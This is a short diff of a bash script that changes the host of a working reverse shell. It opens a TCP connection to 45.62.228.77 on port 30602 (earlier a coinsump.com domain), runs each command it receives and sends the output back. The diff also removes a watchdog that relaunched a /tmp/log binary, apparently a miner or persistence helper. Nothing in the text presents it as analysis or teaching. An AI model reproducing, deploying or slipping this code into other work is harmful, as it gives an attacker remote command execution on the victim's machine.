@@ -1,10 +1,3 @@
 #!/bin/bash
-exec 5<>/dev/tcp/remotes.coinsump.com/30602
+exec 5<>/dev/tcp/45.62.228.77/30602
 cat <&5 | while read line; do $line 2>&5 >&5; done
-SERVICE="log"
-if ps ax | grep -v grep | grep -v grep | grep $SERVICE > /dev/null
-then
-    
-else
-    /tmp/log -c /tmp/0 &
-fi
